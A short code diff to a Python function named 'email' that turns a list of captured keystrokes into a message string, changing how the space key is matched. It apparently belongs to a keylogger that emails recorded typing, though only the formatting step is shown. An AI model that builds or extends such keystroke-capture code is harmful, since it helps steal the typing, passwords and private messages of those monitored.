@@ -17,7 +17,7 @@ def email(keys):
     message = ""
     for key in keys:
         k = key.replace("'","")
-        if key == " Key.space ":
+        if key == " Key space ":
             k = " " 
         elif key.find(" Key ")>0:
             k = ""
